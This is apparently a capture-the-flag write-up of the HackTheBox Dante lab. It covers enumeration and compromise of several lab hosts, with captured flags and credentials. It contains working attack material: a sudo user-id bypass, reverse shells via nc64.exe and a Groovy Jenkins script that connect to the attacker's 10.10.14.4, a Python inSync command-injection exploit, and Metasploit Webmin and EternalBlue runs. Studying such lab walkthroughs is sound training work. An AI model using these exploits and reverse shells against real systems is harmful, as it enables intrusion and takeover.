<figure><img src="../../../.gitbook/assets/image (103) (1).png" alt=""><figcaption></figcaption></figure>

`ben:Welcometomyblog`

`egre55:egre55`

Above is the password of `Ben`. Eventually we will find out that only Ben has SSH onto the machine

```
ssh ben@172.16.1.12
```

<figure><img src="../../../.gitbook/assets/image (104) (1).png" alt=""><figcaption></figcaption></figure>

Get the flag

8th flag: `DANTE{Pretty_Horrific_PH4IL!}`

***

## <mark style="color:red;">Minus + minus = plus?</mark>

Upload linpeas onto the target and run it. Analyzing the output we see a PE vector here when running:

```
sudo -l
```

<figure><img src="../../../.gitbook/assets/image (105) (1).png" alt=""><figcaption></figcaption></figure>

```
(ALL, !root) /bin/bash
```

Googling a bit will lead to the exploit

<figure><img src="../../../.gitbook/assets/image (106) (1).png" alt=""><figcaption></figcaption></figure>

Exploit:

```
sudo -u#-1 /bin/bash
```

<figure><img src="../../../.gitbook/assets/image (107) (1).png" alt=""><figcaption></figcaption></figure>

```
Description :

Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
-u#-1 returns as 0 which is root's id

and /bin/bash is executed with root permission
```

Get the flag

9th flag: `DANTE{sudo_M4k3_me_@_Sandwich}`

After that, we check `/etc/shadow`.  We can see user `julian` has a hint on his shadow file

<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

Attempt to crack it using `unshadow`

<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

`julian:manchesterunited`

Add it to our credentials wordlist

***

## <mark style="color:red;">Let's take this discussion elsewhere</mark>

### 172.16.1.13 (WS01)

```
Nmap scan report for 172.16.1.13
Host is up (0.29s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.7)
| http-title: Welcome to XAMPP
|_Requested resource was http://172.16.1.13/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7
443/tcp open  ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.7)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.7
| tls-alpn: 
|_  http/1.1
| http-title: Welcome to XAMPP
|_Requested resource was https://172.16.1.13/dashboard/
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
445/tcp open  microsoft-ds?

Host script results:
| smb2-time: 
|   date: 2025-03-15T04:37:26
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: DANTE-WS01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:fd:ba (VMware)
```

Like the previous subnet, this one has a XAMPP service running on port `80` and `443.` But this time its a Windows machine. It also has SMB port up. Let's enumerate

<figure><img src="../../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

Denied listing as Anonymous. Let's continue to fuzz the XAMPP service website

```
feroxbuster -u http://172.16.1.13 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

<figure><img src="../../../.gitbook/assets/image (726).png" alt=""><figcaption></figcaption></figure>

We see a directory `/discuss` with multiple interesting sub directories. Let's check them out

<figure><img src="../../../.gitbook/assets/image (727).png" alt=""><figcaption></figcaption></figure>

We are met with a forum webpage. I tried looking around and navigating to the directories. `/admin`  doesn't exist.&#x20;

<figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

`/DB` gave us an sql file

<figure><img src="../../../.gitbook/assets/image (729).png" alt=""><figcaption></figcaption></figure>

I downloaded it and opened it up to see the contents

<figure><img src="../../../.gitbook/assets/image (730).png" alt=""><figcaption></figcaption></figure>

Now, we found a user named John. From here, I tried SQLi into `admin` and `john` but nothing came out but here's the thing. In the picture there, there a directory was mentioned, `/ups`.This is important for the next step.&#x20;

I created a random account and there was a file upload feature. Perfect for uplaoding PHP reverse shells. So I tried one right off the bat.

<figure><img src="../../../.gitbook/assets/image (731).png" alt=""><figcaption></figcaption></figure>

And it worked, we were registered and the file was uploaded

<figure><img src="../../../.gitbook/assets/image (732).png" alt=""><figcaption></figcaption></figure>

then I utilised the `/ups` directory to navigate my uploads

<figure><img src="../../../.gitbook/assets/image (733).png" alt=""><figcaption></figcaption></figure>

I started a listener and executed it

```
rlwrap nc -lvnp 1234
```

But....it didn't work. I didn't get a shell and I did not know why. I was tired man. Then, I gave another shot by uploading a webshell

<figure><img src="../../../.gitbook/assets/image (734).png" alt=""><figcaption></figcaption></figure>

It worked bruh finally. Now let's run some basic commands

```
whoami
```

<figure><img src="../../../.gitbook/assets/image (735).png" alt=""><figcaption></figcaption></figure>

Since we are on a Windows machine, the flag would usually be located in the users Desktop

```
type C:\Users\gerald\Desktop\flag.txt
```

<figure><img src="../../../.gitbook/assets/image (736).png" alt=""><figcaption></figcaption></figure>

10th flag: `DANTE{l355_t4lk_m04r_l15tening}`

***

## <mark style="color:red;">Compare my numbers</mark>

Now, we need to get onto the Windows machine itself. We need to setup a reverse shell connection. For this we can utilise `nc.exe` . A netcat, but for Windows. Start a python server and download it using Powershell

```
powershell wget http://10.10.14.4:8000/nc64.exe -o nc64.exe
```

Verify it has been downloaded

```
dir
```

<figure><img src="../../../.gitbook/assets/image (737).png" alt=""><figcaption></figcaption></figure>

Start a listener on our machine

```
nc -lvnp 1234
```

Execute nc64.exe

```
nc64.exe 10.10.14.4 1234 -e cmd.exe
```

<figure><img src="../../../.gitbook/assets/image (738).png" alt=""><figcaption></figcaption></figure>

Callback received!!

Now, we check available privileges

```
whoami /all
```

```
USER INFORMATION
----------------

User Name         SID                                           
================= ==============================================
dante-ws01\gerald S-1-5-21-3659841024-4065501111-2845508916-1001


GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes                                        
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only                          
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only                          
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

Looks like there's nothing we could use. After that, I uploaded Winpeas on the target machine

<figure><img src="../../../.gitbook/assets/image (739).png" alt=""><figcaption></figcaption></figure>

Looking throught the output, this caught my eye

<figure><img src="../../../.gitbook/assets/image (740).png" alt=""><figcaption></figcaption></figure>

I didn't know what it was, so I googled a bit

<figure><img src="../../../.gitbook/assets/image (741).png" alt=""><figcaption></figcaption></figure>

I also tried to look for some available exploits

<figure><img src="../../../.gitbook/assets/image (742).png" alt=""><figcaption></figcaption></figure>

Here's a brief understanding what the underlying vulnerability is

<figure><img src="../../../.gitbook/assets/image (743).png" alt=""><figcaption></figcaption></figure>

We can verify the exposed port from the winpeas output

<figure><img src="../../../.gitbook/assets/image (744).png" alt=""><figcaption></figcaption></figure>

Rapid7 has an exploit built in Metasploit's module. This was supposed to be an easy win by generating the reverse shell payload using Msfvenom and starting a listener to get the Meterpreter shell and then using that session to launch the inSync exploit. There were 3 problems. The main problem was this:

<figure><img src="../../../.gitbook/assets/image (745).png" alt=""><figcaption></figcaption></figure>

I couldn't execute the the generated payload and get the shell because of Defender. So I started looking for alternatives and found a Python POC

<figure><img src="../../../.gitbook/assets/image (746).png" alt=""><figcaption></figcaption></figure>

```python
import socket
import struct
import sys

# Command injection in inSyncCPHwnet64 RPC service
# Runs as nt authority\system. so we have a local privilege escalation

if len(sys.argv) < 2:
    print "Usage: " + __file__ + " <quoted command to execute>"
    print "E.g. " + __file__ + " \"net user /add tenable\""
    sys.exit(0)

ip = '127.0.0.1'
port = 6064
command_line = sys.argv[1]

# command gets passed to CreateProcessW
def make_wide(str):
    new_str = ''
    for c in str:
        new_str += c
        new_str += '\x00'
    return new_str

hello = "inSync PHC RPCW[v0002]"
func_num = "\x05\x00\x00\x00"      # 05 is to run a command
command_line = make_wide(command_line)
command_length = struct.pack('<i', len(command_line))

# send each request separately
requests = [ hello, func_num, command_length, command_line ]

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip, port))

i = 1
for req in requests:
    print 'Sending request' + str(i)
    sock.send(req)
    i += 1

sock.close()

print "Done."
```

The 2nd problem was there was no Python on the system. I tried to transfer manually from my machine to the target but it also didn't work. Until, I saw this:

<figure><img src="../../../.gitbook/assets/image (747).png" alt=""><figcaption></figcaption></figure>

And guess what's inside?

<figure><img src="../../../.gitbook/assets/image (748).png" alt=""><figcaption></figcaption></figure>

A python executable and the exploit itself. I don't know why it was there but boy was I glad. I spent so long troubleshooting time-wasting problems.

Now, for the 3rd problem.

<figure><img src="../../../.gitbook/assets/image (749).png" alt=""><figcaption></figcaption></figure>

Although the command was correct, attempting to read the flag directly or outputting the flag to a file didn't work for some reason, it could be because of UAC idk.

So, I decided to just opt for a reverse shell using the earlier `nc.exe` we uploaded. Start a listener first on a different port

```
nc -lvnp 1235
```

From the `Python27` folder run the command:

```
C:\Python27\python.exe druva.py "Windows\system32\cmd.exe /c C:\xampp\htdocs\discuss\ups\nc64.exe 10.10.14.4 1235 -e cmd.exe"
```

<figure><img src="../../../.gitbook/assets/image (750).png" alt=""><figcaption></figcaption></figure>

And boom, we have a SYSTEM session on the target. Now, we can read the flag from `Administrator`'s Desktop

```
type C:\Users\Administrator\Desktop\flag.txt
```

11th flag: `DANTE{Bad_pr4ct1ces_Thru_strncmp}`

***

## <mark style="color:red;">Feeling fintastic</mark>

### 172.16.1.17 (DANTE-NIX03)

```
Nmap scan report for 172.16.1.17
Host is up (0.29s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT      STATE    SERVICE     VERSION
80/tcp    open     http        Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 37M   2020-06-25 13:00  webmin-1.900.zip
| -     2020-07-13 02:21  webmin/
|_
|_http-title: Index of /
139/tcp   open     netbios-ssn Samba smbd 4.6.2
445/tcp   open     netbios-ssn Samba smbd 4.6.2
5061/tcp  filtered sip-tls
6788/tcp  filtered smc-http
10000/tcp open     http        MiniServ 1.900 (Webmin httpd)
|_http-title: Login to Webmin
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: Host: 127.0.0.1

Host script results:
|_nbstat: NetBIOS name: DANTE-NIX03, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-15T04:37:26
|_  start_date: N/A
```

We can see a few unusual ports besides HTTP and SMB, also there is a Webmin service. Webmin is a web-based server management control panel for Unix-like systems. Like usual, let us start by enumerating the SMB port

```
smbclient -L \\\\172.16.1.17\\
```

<figure><img src="../../../.gitbook/assets/image (74) (1).png" alt=""><figcaption></figcaption></figure>

We got something here, a share named `forensics`. Enumerate more

```
smbclient //172.16.1.17/forensics -c 'recurse;ls'
```

<figure><img src="../../../.gitbook/assets/image (75) (1).png" alt=""><figcaption></figcaption></figure>

There is a file inside. Download it onto our machine

```
smbclient //172.16.1.17/forensics -c 'get monitor'
```

Analyze the file type

```
file monitor
```

<figure><img src="../../../.gitbook/assets/image (76) (1).png" alt=""><figcaption></figcaption></figure>

Its a PCAP file. We can do further analysis using Wireshark

<figure><img src="../../../.gitbook/assets/image (77) (1).png" alt=""><figcaption></figcaption></figure>

Right off the bat, a HTTP packet jumped right out from the webmin port which is `10000` with the admin credentials.&#x20;

`admin:password6543`

Okay, lets head to the webmin page

<figure><img src="../../../.gitbook/assets/image (78) (1).png" alt=""><figcaption></figcaption></figure>

We are prompted with a login page. Enter the credentials earlier, but we will get an error

<figure><img src="../../../.gitbook/assets/image (79) (1).png" alt=""><figcaption></figcaption></figure>

So i decided to look again at the PCAP file. Instead of looking at the packets at surface area. I followed the HTTP stream of the packets

<figure><img src="../../../.gitbook/assets/image (80) (1).png" alt=""><figcaption></figcaption></figure>

This is the packet we inspected earlier let's scroll down.

<figure><img src="../../../.gitbook/assets/image (81) (1).png" alt=""><figcaption></figcaption></figure>

No wonder an error occured...it was literally the wrong password. Continue to check other packets in the stream

<figure><img src="../../../.gitbook/assets/image (82) (1).png" alt=""><figcaption></figcaption></figure>

In the 5th packet of the stream, its the same credentials but with a capital P in `Password6543`, checking the following packets show that the dashboard loaded and returned a success message

<figure><img src="../../../.gitbook/assets/image (83) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (84) (1).png" alt=""><figcaption></figcaption></figure>

`admin:Password6543`

Okay, let's try it out now.

<figure><img src="../../../.gitbook/assets/image (85) (1).png" alt=""><figcaption></figcaption></figure>

Cool we got in. Now if we look at the lower part of the dashboard, we can see what version the webmin service is using. We are on Webmin 1.900. It also hints that it was exploitable.

<figure><img src="../../../.gitbook/assets/image (86) (1).png" alt=""><figcaption></figcaption></figure>

This Github Advisory Database provides several links for the resources and articles. Rapid7's website provides the module in Metasploit to ease our exploitation

<figure><img src="../../../.gitbook/assets/image (87) (1).png" alt=""><figcaption></figcaption></figure>

It provides the guide on which module to use. We also need to check for the options

```
msfconsole
msf6 > use exploit/unix/webapp/webmin_upload_exec
msf6 exploit(unix/webapp/webmin_upload_exec) > show options
```

<figure><img src="../../../.gitbook/assets/image (88) (1).png" alt=""><figcaption></figcaption></figure>

It requires some essential parameters to be filled like the username, password, target host and target URL where webmin is hosted. After all required parameters are filled, start the exploit

```
msf6 exploit(unix/webapp/webmin_upload_exec) > set password Password6543
msf6 exploit(unix/webapp/webmin_upload_exec) > set username admin
msf6 exploit(unix/webapp/webmin_upload_exec) > set rhost 172.16.1.17
msf6 exploit(unix/webapp/webmin_upload_exec) > exploit
```

Unfortunately, this exploit didnt work even though I have disabled SSL option.

<figure><img src="../../../.gitbook/assets/image (89) (1).png" alt=""><figcaption></figcaption></figure>

I'm beginning to hate Metasploit...anyways I looked for alternative webmin exploit modules on Metasploit.

<figure><img src="../../../.gitbook/assets/image (90) (1).png" alt=""><figcaption></figcaption></figure>

This one looked promising, the parameters were the same as the first module

<figure><img src="../../../.gitbook/assets/image (91) (1).png" alt=""><figcaption></figcaption></figure>

```
msf6 > use 7
msf6 exploit(linux/http/webmin_packageup_rce) > set password Password6543
msf6 exploit(linux/http/webmin_packageup_rce) > set rhost 172.16.1.17
msf6 exploit(linux/http/webmin_packageup_rce) > set username admin
msf6 exploit(linux/http/webmin_packageup_rce) > set lhost 10.10.14.4
msf6 exploit(linux/http/webmin_packageup_rce) > set lport 4444
msf6 exploit(linux/http/webmin_packageup_rce) > exploit
```

<figure><img src="../../../.gitbook/assets/image (92) (1).png" alt=""><figcaption></figcaption></figure>

Nice, so we have a root session. I went back to the webmin site to look at the available users

<figure><img src="../../../.gitbook/assets/image (93) (1).png" alt=""><figcaption></figcaption></figure>

We have user `lou` . Tried to read the flag from her home directory but the flag wasn't there. Then, i just read the root flag.

```
cat /root/flag.txt
```

12th flag: `DANTE{SH4RKS_4R3_3V3RYWHERE}`

***

## <mark style="color:red;">That just blew my mind</mark>

### 172.16.1.19 (DANTE-NIX07)

```
Nmap scan report for 172.16.1.19
Host is up (0.29s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Index of /
8080/tcp open  http    Jetty 9.4.27.v20200227
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.27.v20200227)
Service Info: Host: 127.0.0.1
```

We can see 2 HTTP ports are opened here. Port `80` is just the server (basically nothing). Port `8080` has a Jetty service which is a Java web server. It clearly states its using the version 9.4.27. It also has a `/robots.txt` directory but that doesn't show anything useful

Looking at the webpage, reveals a login page

<figure><img src="../../../.gitbook/assets/image (46) (1).png" alt=""><figcaption></figcaption></figure>

Let's try to look for some exploits

<figure><img src="../../../.gitbook/assets/image (45) (1).png" alt=""><figcaption></figcaption></figure>

Looking at the Advisory Database here, none of the articles showed a vulnerability that discloses a direct way to access the site through a login page. Therefore, the credentials must be stored somewhere in the different subnets. Let's leave this one on hold

## <mark style="color:red;">Very well, sir</mark>

Continuation of the progress was over here in later sections

{% embed url="https://mfkrypt.gitbook.io/stuff/ctf-writeups/hackthebox/prolabs/dante#my-cup-runneth-over" %}

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

`Admin_129834765:SamsungOctober102030`

<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

17th flag: `DANTE{to_g0_4ward_y0u_mus7_g0_back}`

***

## <mark style="color:red;">We're going round in circles</mark>

I did a bit of googling on how to get inside the jenkins server after getting admin, but there were no clear answers. So ChatGPT helped me,&#x20;

<figure><img src="../../../.gitbook/assets/image (770).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (771).png" alt=""><figcaption></figcaption></figure>

There is indeed a script console present. Let's make a reverse shell script using the Groovy language

```groovy
String host="10.10.14.4"; int port=1234;
String cmd="/bin/bash";

Socket s=new Socket(host,port);
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(), so=s.getOutputStream(), se=s.getOutputStream();

while (!s.isClosed()) {
    while (pi.available()>0) so.write(pi.read());
    while (pe.available()>0) se.write(pe.read());
    while (si.available()>0) po.write(si.read());
    po.flush(); so.flush(); se.flush();
    Thread.sleep(50);
}

p.destroy(); s.close();
```

Start a listener and run it

<figure><img src="../../../.gitbook/assets/image (772).png" alt=""><figcaption></figcaption></figure>

Nice, we get a connection but it seems its a semi shell. Try to upgrade it with a generic Python pty module

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

<figure><img src="../../../.gitbook/assets/image (773).png" alt=""><figcaption></figcaption></figure>

Looks like we are the jenkins admin user but we don't have any home directory or flag lol

<figure><img src="../../../.gitbook/assets/image (774).png" alt=""><figcaption></figcaption></figure>

We have user `ian` and `lou`

Looking around, in /var/lib/jenkins. There is a `secret.key` and `master.key` in `/secrets`. This unfortunately was a rabbit hole

<figure><img src="../../../.gitbook/assets/image (775).png" alt=""><figcaption></figcaption></figure>

Then I uploaded linpeas to try and look for some misconfigs. Then I saw this PE vector

<figure><img src="../../../.gitbook/assets/image (776).png" alt=""><figcaption></figcaption></figure>

I tried to replicate the Polkit vulnerability POC here but it just wont work...

{% embed url="https://github.com/LucasPDiniz/CVE-2021-3560" %}

Then I tried uploading pspy and see anything useful

<figure><img src="../../../.gitbook/assets/image (777).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (778).png" alt=""><figcaption></figcaption></figure>

And we catch root logging into `ian` 's MYSQL account with his password being visible. Let us now log into his `ian` .&#x20;

`ian:VPN123ZXC`

Now, I tried running linpeas again but this time as `ian`. I found this lmaoo.

<figure><img src="../../../.gitbook/assets/image (779).png" alt=""><figcaption></figcaption></figure>

I found this blog on the disk group privilege escalation on how to replicate it&#x20;

<figure><img src="../../../.gitbook/assets/image (780).png" alt=""><figcaption></figcaption></figure>

First, we need to identify what the partition is the root paritition mounted on

```
df -h
```

<figure><img src="../../../.gitbook/assets/image (781).png" alt=""><figcaption></figcaption></figure>

Okay, so its `/dev/sda5`. To examine and modify the partition the `debugfs` utility can be used . This utility can also be used to create a directory or read the contents of a directory.

```
debugfs /dev/sda5
mkdir exploit
```

<figure><img src="../../../.gitbook/assets/image (782).png" alt=""><figcaption></figcaption></figure>

After creating a test directory using `debugfs` utility, it shows that the filesystem has read/only permissions. By right, we should also have permission to read the directly read the root flag

<figure><img src="../../../.gitbook/assets/image (783).png" alt=""><figcaption></figcaption></figure>

18th flag: `DANTE{g0tta_<3_ins3cur3_GROupz!}`

***

### 172.16.1.20 (DANTE-DC01)

```
Nmap scan report for 172.16.1.20
Host is up (0.29s latency).
Not shown: 978 closed tcp ports (conn-refused)
Bug in http-title: no string output.
Bug in http-title: no string output.
PORT      STATE SERVICE            VERSION
22/tcp    open  ssh                OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 15:19:e6:66:c3:4f:f7:80:7e:48:f7:b9:9a:f9:ee:08 (RSA)
|   256 f3:ea:12:b5:fa:b0:0c:14:fb:65:98:0f:09:92:5c:56 (ECDSA)
|_  256 42:ca:16:67:5a:e7:a2:01:b0:63:4b:f7:ed:55:db:90 (ED25519)
53/tcp    open  domain             Simple DNS Plus
80/tcp    open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 1 disallowed entry 
|_/ 
|_http-server-header: Microsoft-IIS/8.5
88/tcp    open  kerberos-sec       Microsoft Windows Kerberos (server time: 2025-03-15 04:34:01Z)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
389/tcp   open  ldap               Microsoft Windows Active Directory LDAP (Domain: DANTE.local, Site: Default-First-Site-Name)
443/tcp   open  ssl/http           Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=DANTE-DC01
| Subject Alternative Name: othername: UPN::S-1-5-21-2273245918-2602599687-2649756301-1003
| Not valid before: 2020-08-07T09:32:48
|_Not valid after:  2025-08-06T09:32:48
|_http-server-header: Microsoft-IIS/8.5
|_ssl-date: 2025-03-15T04:37:50+00:00; -1s from scanner time.
| http-robots.txt: 1 disallowed entry 
|_/ 
445/tcp   open  microsoft-ds       Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: DANTE)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap               Microsoft Windows Active Directory LDAP (Domain: DANTE.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=DANTE-DC01.DANTE.local
| Not valid before: 2025-03-14T03:31:43
|_Not valid after:  2025-09-13T03:31:43
|_ssl-date: 2025-03-15T04:37:51+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: DANTE
|   NetBIOS_Domain_Name: DANTE
|   NetBIOS_Computer_Name: DANTE-DC01
|   DNS_Domain_Name: DANTE.local
|   DNS_Computer_Name: DANTE-DC01.DANTE.local
|   DNS_Tree_Name: DANTE.local
|   Product_Version: 6.3.9600
|_  System_Time: 2025-03-15T04:37:10+00:00
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: DANTE-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_nbstat: NetBIOS name: DANTE-DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:74:5f (VMware)
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: DANTE-DC01
|   NetBIOS computer name: DANTE-DC01\x00
|   Domain name: DANTE.local
|   Forest name: DANTE.local
|   FQDN: DANTE-DC01.DANTE.local
|_  System time: 2025-03-15T04:37:18+00:00
|_clock-skew: mean: 5s, deviation: 13s, median: 0s
| smb2-time: 
|   date: 2025-03-15T04:37:19
|_  start_date: 2025-03-15T03:31:12
```

Cool, we are now dealing with an AD machine. Standard, we can see some HTTP and SMB. Also notable, Kerberos and LDAP is present. Let's hope to find some interesting attack vectors

Notice the OS:

```
OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
```

Its vulnerable to the EternalBlue exploit

<figure><img src="../../../.gitbook/assets/image (47) (1).png" alt=""><figcaption></figcaption></figure>

There are exploits built in Metasploit. Let's look at some

<figure><img src="../../../.gitbook/assets/image (49) (1).png" alt=""><figcaption></figcaption></figure>

I used this one initially

<figure><img src="../../../.gitbook/assets/image (50) (1).png" alt=""><figcaption></figcaption></figure>

After entering the required parameters, it failed

<figure><img src="../../../.gitbook/assets/image (51) (1).png" alt=""><figcaption></figcaption></figure>

So, I used another exploit, specifically the `psexec` variant

<figure><img src="../../../.gitbook/assets/image (52) (1).png" alt=""><figcaption></figcaption></figure>

```
msf6 > use exploit/windows/smb/ms17_010_psexec
msf6 exploit(windows/smb/ms17_010_psexec) > 
msf6 exploit(windows/smb/ms17_010_psexec) > set lhost 10.10.14.4
msf6 exploit(windows/smb/ms17_010_psexec) > set rhost 172.16.1.20
msf6 exploit(windows/smb/ms17_010_psexec) > exploit
```

<figure><img src="../../../.gitbook/assets/image (53) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (54) (1).png" alt=""><figcaption></figcaption></figure>

And, we get a SYSTEM session. Noice, lets look at some of these users

<figure><img src="../../../.gitbook/assets/image (55) (1).png" alt=""><figcaption></figcaption></figure>

We have users `katwamba`

```
meterpreter > dir
Listing: C:\Users\katwamba
==========================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
040777/rwxrwxrwx  0        dir   2020-08-05 22:06:00 +0800  .ssh
040777/rwxrwxrwx  0        dir   2020-06-10 19:36:41 +0800  AppData
040777/rwxrwxrwx  0        dir   2020-06-10 19:36:41 +0800  Application Data
040555/r-xr-xr-x  0        dir   2020-07-11 02:46:46 +0800  Contacts
040777/rwxrwxrwx  0        dir   2020-06-10 19:36:41 +0800  Cookies
040555/r-xr-xr-x  4096     dir   2021-04-14 17:44:39 +0800  Desktop
040555/r-xr-xr-x  4096     dir   2020-09-30 02:45:26 +0800  Documents
040555/r-xr-xr-x  4096     dir   2021-03-02 19:11:00 +0800  Downloads
040555/r-xr-xr-x  0        dir   2020-07-11 02:46:46 +0800  Favorites
040555/r-xr-xr-x  0        dir   2020-07-11 02:46:46 +0800  Links
040777/rwxrwxrwx  0        dir   2020-06-10 19:36:41 +0800  Local Settings
040555/r-xr-xr-x  0        dir   2020-07-11 02:46:46 +0800  Music
040777/rwxrwxrwx  0        dir   2020-06-10 19:36:41 +0800  My Documents
100666/rw-rw-rw-  524288   fil   2022-09-04 20:33:26 +0800  NTUSER.DAT
100666/rw-rw-rw-  1048576  fil   2025-03-18 15:56:17 +0800  NTUSER.DAT{1f7773c3-0b42-11e3-80ad-e13d1ded4f19}.TxR.0.regtrans-ms
100666/rw-rw-rw-  1048576  fil   2025-03-18 15:56:17 +0800  NTUSER.DAT{1f7773c3-0b42-11e3-80ad-e13d1ded4f19}.TxR.1.regtrans-ms
100666/rw-rw-rw-  1048576  fil   2025-03-18 15:56:17 +0800  NTUSER.DAT{1f7773c3-0b42-11e3-80ad-e13d1ded4f19}.TxR.2.regtrans-ms
100666/rw-rw-rw-  65536    fil   2025-03-18 15:56:17 +0800  NTUSER.DAT{1f7773c3-0b42-11e3-80ad-e13d1ded4f19}.TxR.blf
100666/rw-rw-rw-  65536    fil   2020-06-10 19:38:29 +0800  NTUSER.DAT{1f7773c4-0b42-11e3-80ad-e13d1ded4f19}.TM.blf
100666/rw-rw-rw-  524288   fil   2020-06-10 19:38:29 +0800  NTUSER.DAT{1f7773c4-0b42-11e3-80ad-e13d1ded4f19}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288   fil   2020-06-10 19:38:29 +0800  NTUSER.DAT{1f7773c4-0b42-11e3-80ad-e13d1ded4f19}.TMContainer00000000000000000002.regtrans-ms
040777/rwxrwxrwx  0        dir   2020-06-10 19:36:41 +0800  NetHood
040555/r-xr-xr-x  0        dir   2020-07-11 02:46:46 +0800  Pictures
040777/rwxrwxrwx  0        dir   2020-06-10 19:36:41 +0800  PrintHood
